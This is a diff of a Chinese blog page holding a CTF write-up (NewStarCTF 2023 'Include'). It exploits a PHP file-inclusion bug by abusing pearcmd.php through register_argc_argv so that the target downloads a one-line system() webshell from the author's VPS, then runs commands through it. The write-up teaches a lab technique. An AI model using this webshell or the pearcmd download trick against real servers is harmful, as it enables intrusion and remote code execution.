@@ -3,15 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Include 🍐 · Maple/G7</title>
-<meta name="description" content="NewStarCTF 2023 公开赛道。include 有后缀拼接、黑名单也很严，先靠 phpinfo 拿到 register_argc_argv，再用 pearcmd.php 让靶机自己去下载木马。">
+<title>[NewStarCTF 2023 公开赛道]Include 🍐 · Maple/G7</title>
+<meta name="description" content="NewStarCTF 2023 公开赛道 · include 后缀拼接 + 严格黑名单，靠 phpinfo 拿到 register_argc_argv，再用 pearcmd.php 让靶机下载木马。">
 <script>document.documentElement.classList.add('js');</script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500&family=Noto+Serif+SC:wght@400;600;900&family=Noto+Sans+SC:wght@300;400;500&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css?v=v14">
+<link rel="stylesheet" href="style.css?v=v15">
 </head>
-<body class="page-post">
+<body class="page-post page-wp">
 
 <div class="grain" aria-hidden="true"></div>
 <div class="rule-rail" aria-hidden="true"></div>
@@ -34,16 +34,13 @@
 
 <article class="post">
 
-  <header class="cover">
-    <div class="cover-art" aria-hidden="true">
-      <img src="img/cover-wp2.webp" alt="" style="object-position: 50% 45%" fetchpriority="high" decoding="async">
-    </div>
+  <header class="cover cover--plain">
     <div class="cover-ticks" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
 
     <div class="cover-inner">
-      <p class="kicker mono"><span class="k-no">01</span>NOTES <em>·</em> WP <em>·</em> 2026.11.11</p>
-      <h1 class="post-title">Include 🍐</h1>
-      <p class="post-desc">NewStarCTF 2023 公开赛道。include 有后缀拼接、黑名单也很严，先靠 phpinfo 拿到 register_argc_argv，再用 pearcmd.php 让靶机自己去下载木马。</p>
+      <p class="kicker mono"><span class="k-no">01</span>WP <em>·</em> 2026.11.11</p>
+      <h1 class="post-title post-title--long">[NewStarCTF 2023 公开赛道]Include 🍐</h1>
+      <p class="post-desc">NewStarCTF 2023 公开赛道 · include 后缀拼接 + 严格黑名单，靠 phpinfo 拿到 register_argc_argv，再用 pearcmd.php 让靶机下载木马。</p>
 
       <ul class="post-meta mono">
         <li><b>473</b>字</li>
@@ -63,14 +60,11 @@
 
     <aside class="toc">
       <div class="toc-sticky">
-        <p class="rail-h mono">INDEX</p>
-        <ol class="toc-list"><li class="toc-item toc-l2"><a href="#s1" data-toc="s1"><span class="toc-no">01</span><span class="toc-tx">题目源码</span></a></li><li class="toc-item toc-l2"><a href="#s2" data-toc="s2"><span class="toc-no">02</span><span class="toc-tx">源码审计</span></a></li><li class="toc-item toc-l2"><a href="#s3" data-toc="s3"><span class="toc-no">03</span><span class="toc-tx">phpinfo 与 register_argc_argv</span></a></li><li class="toc-item toc-l2"><a href="#s4" data-toc="s4"><span class="toc-no">04</span><span class="toc-tx">用 pearcmd 下载木马</span></a></li><li class="toc-item toc-l2"><a href="#s5" data-toc="s5"><span class="toc-no">05</span><span class="toc-tx">拿到 flag</span></a></li></ol>
         <img class="toc-mo" src="img/mo-01.webp" alt="" aria-hidden="true">
       </div>
     </aside>
 
-    <div class="prose"><h2 id="s1">题目源码<a class="h-link" href="#s1" aria-hidden="true">§</a></h2>
-<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+    <div class="prose"><div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
     <span class="hljs-title">error_reporting</span>(<span class="hljs-number">0</span>);
     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {
         <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];
@@ -86,18 +80,15 @@
         <span class="hljs-keyword">highlight_file</span>(__FILE__);
     }
 ?&gt;</code></pre></div>
-<h2 id="s2">源码审计<a class="h-link" href="#s2" aria-hidden="true">§</a></h2>
 <p>源码审计：</p>
 <p>存在黑名单，禁了<code>flag|log|session|filter|input|data</code>。</p>
 <p><code>include($file.".php")</code> 有后缀拼接。</p>
 <p>注释提示 <code>phpinfo.php</code> ，先拿配置。</p>
-<h2 id="s3">phpinfo 与 register_argc_argv<a class="h-link" href="#s3" aria-hidden="true">§</a></h2>
 <p>传<code>?file=phpinfo</code>，查看配置:</p>
 <p>老规矩，先搜flag，提示检查register_argc_argv。</p>
 <figure class="fig"><img src="img/wp2-1.webp" alt="phpinfo 里搜 flag" loading="lazy" decoding="async"></figure>
 <figure class="fig"><img src="img/wp2-2.webp" alt="register_argc_argv = On" loading="lazy" decoding="async"></figure>
 <blockquote><ol><li>什么是 <code>register_argc_argv</code>: 在平时，PHP 是运行在 Web 服务器上的，用来接收网址里的参数（比如 <code>?file=xxx</code>）。而 <code>argv</code> 原本是Linux终端里接收命令行参数的。当这个配置设为 <code>On</code> 时，意味着在网址里用 <code>+</code> 或者 <code>&amp;</code> 拼出来的内容，会被 PHP 识别成类似终端里的命令参数。</li></ol><ol><li>pear： <code>PEAR</code> 是 PHP 的一个包管理器（类似于 Python 的 pip）。 <code>pearcmd.php</code> 是它的命令行入口文件，有 <code>install</code> 功能，<strong>从网上下载指定的文件，保存到本地</strong>。 比如执行 <code>pear install -R /tmp http://ip/shell.php</code>，表示从远程 URL 下载文件，并保存到本地 <code>/tmp</code> 目录下，从而<strong>解决“没有上传点”的问题</strong>！</li></ol></blockquote>
-<h2 id="s4">用 pearcmd 下载木马<a class="h-link" href="#s4" aria-hidden="true">§</a></h2>
 <p>这个题目没有上传点，只有一个文件包含漏洞，在phpinfo里查一下也可知远程包含不可用，本题提示已经很明显了，用pear自行上网下载，靶机肯定是不认识我们的个人电脑的（没有公网IP），这个时候就需要VPS了，我平时一般用的<strong>阿里云的VPS+Xshell（XFTP）</strong>。</p>
 <div class="code" data-lang="bash"><div class="code-head"><span class="code-lang">bash</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;?php system($_GET[cmd]); ?&gt;'</span> &gt; evil.php  <span class="hljs-comment">#构造一句话木马</span>
 python3 -m http.server <span class="hljs-number">80</span>   <span class="hljs-comment">#把当前的文件夹变成一个下载网站。端口默认是 80。只要有靶机来访问这个 IP，Python 就会把对应的文件发过去。</span></code></pre></div>
@@ -108,7 +99,6 @@ python3 -m http.server <span class="hljs-number">80</span>   <span class="hljs-c
 <p><code>GET /evil.php</code> 带 200，就说明我们的目标靶机成功拿到了木马</p>
 <figure class="fig"><img src="img/wp2-5.webp" alt="木马落地到 /tmp" loading="lazy" decoding="async"></figure>
 <blockquote><p>当我们在pear里面用 <code>install</code> 命令时，它以为要下载的是正规的软件安装包（后缀通常是 <code>.tgz</code> 的压缩包）。所以像<code>evil.php</code>这样的文件传过来，他准备解压就会报错，我们就利用它的报错信息去获得下载文件的绝对地址（"/tmp/tmp/pear/download/evil.php"）</p></blockquote>
-<h2 id="s5">拿到 flag<a class="h-link" href="#s5" aria-hidden="true">§</a></h2>
 <p>访问：</p>
 <div class="code" data-lang="text"><div class="code-head"><span class="code-lang">text</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">/?file=/tmp/tmp/pear/download/evil&amp;cmd=ls /</code></pre></div>
 <figure class="fig"><img src="img/wp2-6.webp" alt="命令执行 ls /" loading="lazy" decoding="async"></figure>
@@ -123,7 +113,7 @@ python3 -m http.server <span class="hljs-number">80</span>   <span class="hljs-c
         <img class="margin-mo" src="img/mo-02.webp" alt="" aria-hidden="true">
         <div class="rail-more rail-more--right">
           <p class="rail-h mono">ALL ARTICLES</p>
-          <ul class="rail-list"><li><a href="post-include-0.html" data-hover><i>·</i>include 0。0</a></li><li class="is-now"><a href="post-include-pear.html"><i>▸</i>Include 🍐</a></li><li><a href="post.html" data-hover><i>·</i>SSRF从0到1</a></li><li><a href="post-http.html" data-hover><i>·</i>HTTP 基础</a></li><li><a href="post-php.html" data-hover><i>·</i>PHP语言基础</a></li></ul>
+          <ul class="rail-list"><li><a href="post.html" data-hover><i>·</i>SSRF从0到1</a></li><li><a href="post-http.html" data-hover><i>·</i>HTTP 基础</a></li><li><a href="post-php.html" data-hover><i>·</i>PHP语言基础</a></li></ul>
         </div>
       </div>
     </aside>
@@ -135,17 +125,6 @@ python3 -m http.server <span class="hljs-number">80</span>   <span class="hljs-c
   <div class="foot-inner">
     <a class="foot-back" href="notes.html" data-hover><span>←</span> 全部文章</a>
 
-    <div class="foot-nav">
-      <a class="foot-link" href="post-include-0.html" data-hover>
-        <span class="mono">PREV</span>
-        <b>include 0。0</b>
-      </a>
-      <a class="foot-link foot-link--next" href="post.html" data-hover>
-        <span class="mono">NEXT</span>
-        <b>SSRF从0到1</b>
-      </a>
-    </div>
-
     <div class="foot-mo" aria-hidden="true">
       <img src="img/mo-03.webp" alt="">
       <img src="img/mo-05.webp" alt="">
@@ -156,6 +135,6 @@ python3 -m http.server <span class="hljs-number">80</span>   <span class="hljs-c
   </div>
 </footer>
 
-<script src="app.js?v=v14"></script>
+<script src="app.js?v=v15"></script>
 </body>
 </html>
